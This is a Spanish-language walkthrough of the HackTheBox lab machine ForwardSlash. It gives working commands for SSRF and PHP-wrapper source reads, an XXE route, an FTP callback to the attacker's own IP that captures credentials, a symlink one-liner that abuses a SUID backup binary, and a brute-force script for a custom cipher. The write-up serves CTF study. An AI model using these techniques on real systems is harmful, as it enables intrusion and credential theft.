---
title: HTB ForwardSlash Write-up (Español)
tags: [HackTheBox, Local File Inclusion, python, SUID]
image: /assets/images/ForwardSlash/1__WQaWuV__SjuK2__xEWvMdl__w.png
published: true
banner: true
---

I cloned my writeup that was originally posted on [medium](https://medium.com/@5ubterranean/htb-forwardslash-write-up-espa%C3%B1ol-66bf6635b65)

ForwardSlash es un máquina basada en Linux que estuvo activa desde el 4 de Abril del 2020 hasta el 3 de Julio, al entrar a su página no encontramos que su sitio a sufrido un defacement por parte de un grupo de hackers, explorando un poco descubrimos que tienen un backup de su página en un subdominio, un de las funciones de sus páginas tiene un LFI por el cual accedemos a unas credenciales que usamos para conectarnos por SSH a la máquina, una vez dentro encontramos un programa que tiene activado el SUID de otro usuario, lo usamos para leer el backup de un archivo config y conseguimos la contraseña de otro usuario, encontramos que tiene un archivo .img protegido por contraseña, y nos encontramos con un mensaje cifrado y el código usado para cifrarlo, modificamos el código para realizar un ataque de fuerza bruta y así desencriptar el mensaje, en el mensaje no encontramos con la clave del archivo .img, lo montamos y encontramos el archivo id\_rsa con el cual nos podemos conectar como root.

# Enumeración

```bash
masscan -e tun0 --rate=500 -p 0–65535 10.10.10.183  
nmap -sC -sV -p 80,22, -Pn -o scan.txt 10.10.10.183

PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:   
|   2048 3c:3b:eb:54:96:81:1d:da:d7:96:c7:0f:b4:7e:e1:cf (RSA)  
|   256 f6:b3:5f:a2:59:e3:1e:57:35:36:c3:fe:5e:3d:1f:66 (ECDSA)  
|\_  256 1b:de:b8:07:35:e8:18:2c:19:d8:cc:dd:77:9c:f2:5e (ED25519)  
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))  
|\_http-server-header: Apache/2.4.29 (Ubuntu)  
|\_http-title: Did not follow redirect to [http://forwardslash.htb](http://forwardslash.htb)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel
```

El escaneo nos dice que el sitio usa el nombre de dominio “forwardslash.htb”, por lo que lo agregamos a nuestro archivo hosts y accedemos a su página web, al hacerlo nos encontramos con el siguiente mensaje.

![](/assets/images/ForwardSlash/1__MAxHRhhCAq3YEzS7NDEx1g.png)


En el mensaje vemos que nos dicen que el sitio usa XML y Logins de FTP automáticos, por lo que es posible que usemos XXE y podamos encontrar algunas credenciales de FTP tiradas por ahí.  
Sin más pistas usamos gobuster: `gobuster dir -u [http://forwardslash.htb/](http://forwardslash.htb/) -w /usr/share/wordlists/dirb/common.txt -x txt,html,php -t 30`

![](/assets/images/ForwardSlash/1__hZiOrGGZLZ89MmwpbugT1Q.png)


Vemos que hay un archivo llamado “note.txt”, al revisarlo encontramos el siguiente mensaje:

```
Pain, we were hacked by some skids that call themselves the "Backslash Gang"... I know... That name...   
Anyway I am just leaving this note here to say that we still have that backup site so we should be fine.

\-chiv
```

Ahí mencionan que tienen un sitio de backup, si bien solo usamos gobuster con la lista “common.txt”, podría ser que el sitio se encuentre en un subdominio, para tratar de encontrarlo usamos ffuf: `ffuf -u [http://forwardslash.htb/](http://forwardslash.htb/) -H “Host: FUZZ.forwardslash.htb” -w /usr/share/wordlists/dirb/common.txt --fs 0`

![](/assets/images/ForwardSlash/1__P3Y8oGTWa9WrDtib4oEXlg.png)


Encontramos el subdominio “backup”, así que accedemos a él.

![](/assets/images/ForwardSlash/1__CoawIkS3tIgjGqV5vFrL9Q.png)


Lo único que tenemos es una página de login, pero vemos que tiene una opción para crearnos una cuenta, así que lo intentamos.

![](/assets/images/ForwardSlash/1__OfkXNpN0frcRRVwFGkyenA.png)


Luego de hacerlo, podemos entrar a un panel que nos da algunas opciones.

![](/assets/images/ForwardSlash/1__ZJwbGqHeWykKwbC__EUo9uw.png)


Además de revisar manualmente todo usamos gobuster para ver si encontramos algo diferente: `gobuster dir -u [http://backup.forwardslash.htb](http://backup.forwardslash.htb) -w /usr/share/wordlists/dirb/common.txt -x txt,html,php -t 30`

![](/assets/images/ForwardSlash/1__uqzArKDSvToGhwJ6PDBYJg.png)


Vemos que hay un directorio llamado “dev”, intentamos acceder a él.

![](/assets/images/ForwardSlash/1__i0fZjBsTuLdRGiOyueDHeQ.png)


Obtenemos un access denied, pero además de eso este sitio nos dice que nuestra IP es la que tiene el acceso denegado, luego de probar agregar algunas cabeceras típicas con IP 127.0.0.1 y no obtener nada dejamos esto de lado.  
Volvemos al panel luego del login, y lo más interesante lo encontramos en “Change Your Profile Picture”.

![](/assets/images/ForwardSlash/1____2FCcsLUKqlf__HBsbWq3tg.png)


Nos encontramos con un mensaje que dice que la función de aquí fue desactivada, entonces revisamos el código de la página para ver si esta solo fue bloqueada exteriormente.

![](/assets/images/ForwardSlash/1__bE8jDIE3l0__pEX2tSq1zjA.png)


Vemos que el formulario activaba una petición post con el parámetro “url”, así que usamos burp, y ponemos el mismo URL de la página en la que nos encontramos en el parámetro “url”.

![](/assets/images/ForwardSlash/1__VAnndZhAW5ezWw2Pv60qDQ.png)
![](/assets/images/ForwardSlash/1__NZW3vC2L6d6Ivjulmn5sTw.png)


Y vemos que pasa algo curioso, luego de la página original recibimos un documento HTML de lo que parece ser el login inicial, lo que significa que podemos acceder a algunas páginas desde el mismo servidor

# Ganando acceso

Recordamos que en el directorio “/dev/” parecía ser nuestra IP la que estaba bloqueada, por lo que podríamos acceder a él usando este formulario.

![](/assets/images/ForwardSlash/1__85X5ehs0UqY5VBlQxIpOSA.png)
![](/assets/images/ForwardSlash/1__Ga01rAjYDEIjGI6YSRYcMA.png)


Y lo obtenemos, lo que parece ser el entorno de pruebas de un Api basada en XML, y ya que utiliza el método GET podríamos interactuar con ella sin problemas desde aquí, pero ese no es el camino que tomaremos, si bien el método “http” es el protocolo usado para acceder a páginas web, en este caso podría tratarse de un wrapper de php, y de ser así otros wrappers podrían funcionar, luego de hacer algunas pruebas comprobamos que es cierto, así que recuperamos el código fuente de “index.php” ubicado en “dev”.

![](/assets/images/ForwardSlash/1__MDYd9s2eec6j__c7hGNjNqg.png)
![](/assets/images/ForwardSlash/1__9f3QcTEoZmR__x0qKUAllAQ.png)


Luego de decodificar el código que recuperamos en base64 y revisarlo encontramos unas credenciales que nos permitirán conectarnos a la máquina por SSH.

![](/assets/images/ForwardSlash/1__2XP2zXOj9yjfUaUmunICCA.png)
![](/assets/images/ForwardSlash/1__DqZLVz2MlBAjrtHePDmnFQ.png)


# Métodos alternativos

Si bien solo pude descubrir estas formas luego de leer el código de index.php en “dev”, por lo que leí en el foro otras personas accedieron a la máquina de estas formas, al menos la segunda.

Si bien como vimos podemos interactuar con “/dev/index.php” a través de “profilepicture.php”, (que de hecho enviaba el parámetro “url” a “api.php”, y podíamos interactuar directamente con esta), el único parámetro revisado para acceder no era nuestra IP, sino que también revisaba el nombre de nuestro usuario, y en caso de ser “admin” nos permitía acceder (que es más que seguro que algunas personas se crearon una cuenta bajo este nombre con el fin de conseguir más privilegios).

![](/assets/images/ForwardSlash/1__elr4hVvobXkQrXtd__VO0jQ.png)


Al acceder a la página esto es lo que tenemos.

![](/assets/images/ForwardSlash/1__T6NRGwL84ZsRDthYvXtdRA.png)


Y tal como deducimos al principio, tenemos un caso de XXE aquí, si bien no conseguimos ejecución de comandos seguro se podía usar de alguna forma para recuperar el archivo deseado.

![](/assets/images/ForwardSlash/1__NbFndXhXiNePQTJezglS8g.png)


Otro método, del cual las únicas pistas que teníamos era la del comienzo, y el comentario de la página en “dev”, “Fix FTP Login”, es que si enviamos el siguiente valor en el parámetro “url”, `http://backup.forwardslash.htb/dev/index.php?xml=ftp://<nuestra IP>"` y tenemos un servidor ftp escuchando, la máquina nos enviaría las credenciales de chiv, para esto iniciamos un servidor ftp con python: `python -m pyftpdlib -p 21`, enviamos la petición con burp:

![](/assets/images/ForwardSlash/1__9NoonDX7WlO8Uv3LLDJFhg.png)


Vemos que al final de la respuesta nos devuelve nuestra IP.

![](/assets/images/ForwardSlash/1__wBQZCDXOBss7CC__9v2H4Qw.png)


Mientras que en nuestro servidor ftp encontramos el intento fallido de un usuario llamado “chiv”.

![](/assets/images/ForwardSlash/1__faE4DMtdeI1tGmnphgW5qw.png)


Si revisamos wireshark encontraremos la contraseña de dicho usuario.

![](/assets/images/ForwardSlash/1__53O0GiJNkyK2Ov__5hOqnkw.png)


# Movimiento lateral

Buscamos los archivos que tienen colocado el SUID usando find: `find / -perm /4000 2> /dev/null`, de todos estos el archivo que llama nuestra atención es “/usr/bin/backup”.

![](/assets/images/ForwardSlash/1__Tw__ysnLhpSgfNgWlCOKUuQ.png)


El dueño de este archivo es “pain”, por lo que seguramente primero tendremos que llegar a este usuario.

![](/assets/images/ForwardSlash/1__yguN6dFdUyC1XPnHzeH0bQ.png)


Ejecutamos el archivo para ver qué hace.

![](/assets/images/ForwardSlash/1__vlSQCtA6s9HpiJULWiI__Ow.png)


De aquí obtenemos mucha información útil, primero, el programa parece ser usado para ver archivos de backup, segundo, el error de que un archivo no existe, tercero, la nota que indica que el archivo de backup tiene que ser tomado en el mismo segundo, intenté hacerle ingeniería inversa al programa usando Ghidra sin mucho éxito, aunque llegué a la conclusión que el programa trata de abrir un archivo del nombre mostrado, y este nombre no es más que un hash de múltiples valores incluyendo el tiempo, para comprobar esto hacemos un one-liner, que ejecute el archivo, tome el nombre mostrado y cree un archivo con dicho nombre, para luego volver a ejecutar el archivo: ``NEWFILE=`/usr/bin/backup | grep ERROR | awk ‘{print $2}’`; echo “hola” > “$NEWFILE”;/usr/bin/backup``

![](/assets/images/ForwardSlash/1__cfnpj0ggDoLfCgwl46WoBA.png)


Tal como dijimos, el programa lee el contenido de un archivo con ese nombre, la única duda que nos queda es qué archivos de backup se pueden leer con este programa, por lo que usamos find para encontrar cualquier archivo o directorio que contenga backup en su nombre: `find / -iname *backup* 2> /dev/null`

![](/assets/images/ForwardSlash/1__qvGutBvyMnRNvfgU6rn__Jw.png)


Entramos a “/var/backup” y vemos que hay un archivo cuyo dueño es pain, config.php.bak.

![](/assets/images/ForwardSlash/1__OwxBuy8n3aD01nqUP60oUw.png)


No tenemos ningún tipo de permiso sobre este archivo por lo que no podemos tratar de modificar su nombre o algo para que el programa lo lea, pero lo que podemos hacer es crear un link simbólico hacia este archivo, por lo que al leer el link simbólico estaríamos leyendo este archivo, volvemos a tmp a una carpeta que hayamos creado nosotros, y ejecutamos el siguiente comando: ``NEWFILE=`/usr/bin/backup | grep ERROR | awk ‘{print $2}’`; ln -s /var/backups/config.php.bak “$NEWFILE”;/usr/bin/backup``

![](/assets/images/ForwardSlash/1__R4Jiy__0V3VcAk3cqlGYQHA.png)


Lo conseguimos, y ahora tenemos la contraseña de pain, por lo que podemos cambiar nuestro usuario hacia él y por fin conseguimos el user.txt.

![](/assets/images/ForwardSlash/1__1ojVziGDYgZ5H__zngOH1lw.png)


# Escalación de privilegios

De hecho, salvo el archivo user.txt teníamos permisos de lectura sobre todos los demás archivos con el usuario “chiv”, y al menos yo ya tenía solucionada esta parte cuando escalé a “pain”, bueno primero leemos la nota.

![](/assets/images/ForwardSlash/1____mo__Mr4YDG__EnheWaVHhNg.png)


Este es un mensaje de chiv para pain, en el cual nos dice que toda la información importante está encriptada, y que utilizaron un poco de criptografía con la contraseña de dicho archivo, entonces vamos al directorio “encryptorinator”.

![](/assets/images/ForwardSlash/1__yuw8Gj9wODvcqUup8fiULQ.png)


Ahí tenemos 2 archivos, ciphertext, que es un montón de texto cifrado irreconocible, y encrypter.py, el cual es el que programa que fue usado para encriptar dicho mensaje.

```python
def encrypt(key, msg):

    key = list(key)

    msg = list(msg)

    for char\_key in key:

        for i in range(len(msg)):

            if i == 0:

                tmp = ord(msg\[i\]) + ord(char\_key) + ord(msg\[-1\])

            else:

                tmp = ord(msg\[i\]) + ord(char\_key) + ord(msg\[i-1\])

            while tmp > 255:

                tmp -= 256

            msg\[i\] = chr(tmp)

    return ''.join(msg)

def decrypt(key, msg):

    key = list(key)

    msg = list(msg)

    for char\_key in reversed(key):

        for i in reversed(range(len(msg))):

            if i == 0:

                tmp = ord(msg\[i\]) - (ord(char\_key) + ord(msg\[-1\]))

            else:

                tmp = ord(msg\[i\]) - (ord(char\_key) + ord(msg\[i-1\]))

            while tmp < 0:

                tmp += 256

            msg\[i\] = chr(tmp)

    return ''.join(msg)

print encrypt('REDACTED', 'REDACTED')

print decrypt('REDACTED', encrypt('REDACTED', 'REDACTED'))
```

Descargamos los archivos para trabajar con ellos localmente, realmente no sé cómo, pero leí que algunos fueron capaces de resolver esta encriptación con lapiz y papel, por mi parte realicé un ataque de fuerza bruta para desencriptar el archivo, lo único que sabemos es que cuando tengamos éxito el texto será legible, por lo que tendremos que guardar el resultado de cada intento en un archivo, para hacer la fuerza bruta agregamos el siguiente código al final del archivo, no sin antes importar “sys”.

```python
a = open("ciphertext",'r')

mess = a.read()

a.close()

keys = open(sys.argv\[1\], 'r')

for line in keys:

    print line, decrypt(line,mess)

keys.close()
```

Para realizar la fuerza bruta usamos el archivo password.lst, ya que rockyou quizás sea muy grande, guardamos todos los resultados en un archivo llamado “decripted”, `python brute.py /usr/share/wordlists/metasploit/password.lst > decripted`.

![](/assets/images/ForwardSlash/1__ujRT____wYH7h9oRlr27OeJw.png)


El archivo pesa 14.8 MB, considerando que es solo texto es un archivo bastante grande, para encontrar el texto cifrado jugamos con strings, y el parámetro “-n” para ir aumentando la longitud de las cadenas, también podríamos haber corrido el programa sin redirigir la salida y estar atentos al momento en que consigamos el texto descifrado, luego de buscar un rato, lo encontramos luego de buscar un rato con la longitud de 19 carácteres (también lo podemos encontrar con longitudes menores, pero esto nos devuelve demasiada información extra por lo que demoraríamos mucho).

![](/assets/images/ForwardSlash/1__xp3HNrrIPiEB9Iz5tnDoLw.png)


Aquí pasa algo curioso, como vemos el mensaje fue descifrado en múltiples ocasiones, guardé todas las contraseñas que dieron el mensaje correcto, pero al usarlas directamente el mensaje no podía ser descifrado, no realicé más pruebas pero definitivamente es un funcionamiento extraño, muy bien tenemos la contraseña, volvemos al directorio “/var/backup”, y vemos el directorio “recovery” al cual solo tienen acceso los miembros del grupo “backupoperator”, grupo del cual somos miembros.

![](/assets/images/ForwardSlash/1__Q2RF9b58hIUEDL34B__SBXQ.png)
![](/assets/images/ForwardSlash/1__wgXuMRap04SsPnwv5Ma4zQ.png)


Ahí vemos el archivo “encrypted\_backup.img”, el cual es un tipo de imagen encriptada.

![](/assets/images/ForwardSlash/1__3oEeS8mn58sta7qZtKKMNA.png)


Saber qué hacer con él es tan simple como ver qué acciones podemos hacer como usuario root, consultamos el `sudo -l` para esto.

![](/assets/images/ForwardSlash/1__pAtCC0K__CwEMzYa577v__7g.png)


Vemos que podemos hacer 3 cosas, usar cryptsetupo luksOpen, con cualquier parámetro luego, montar el dispositivo “/dev/mapper/backup” en ./mnt/ y desmontar dicha carpeta, revisamos si “/dev/mapper/backup” existe.

![](/assets/images/ForwardSlash/1__MtcHMAqepD__ZetPYpxWcCA.png)


No lo hace, por lo que tenemos que abrir la imagen encriptada como “backup”, de forma que podremos montarlo luego, para esto usamos: `sudo /sbin/cryptsetup luksOpen encrypted_backup.img backup`, y confirmamos que ahora dicho dispositivo existe.

![](/assets/images/ForwardSlash/1__5W__tZdA2uOEZUgsthjL50Q.png)
![](/assets/images/ForwardSlash/1__eSs6sT7aQBkw5__5oLK7yyg.png)


Creamos la carpeta “mnt” en alguna carpeta de la cual seamos dueños (recordemos que estamos en una máquina con muchas otras personas, por lo que montarlo en el mnt principal podría darles la solución), y nos encontramos con la llave ssh del usuario root.

![](/assets/images/ForwardSlash/1__CQwvwvGL0M9XN6SR__bp9Xw.png)


Guardamos la llave y nos conectamos como root para terminar con la máquina.

![](/assets/images/ForwardSlash/1__pBMm__Q4CB0qLSyCfvRREhg.png)


Si bien ya tenemos root hay una cosa más que debemos hacer, y esta es desmontar el dispositivo “backup”, ya que cualquier otra persona podría montarlo sin haber desencriptado el texto, esta fue la principal queja que tuvieron en el foro, ya que esto saltaría completamente la escalación de privilegios, para desmontarlo ejecutamos el comando: `cryptsetup luksClose backup` y comprobamos que el dispositivo ya no exista.

![](/assets/images/ForwardSlash/1__wadggvc7xUQmgyz__JgjdYA.png)


Muy bien ahora sí acabamos con la máquina.

# Descargo de responsabilidad

Todos los recursos brindados en este post se hicieron puramente con fines educativos y de concientización, el autor no se hace responsable por las acciones que las personas puedan realizar con el contenido del mismo.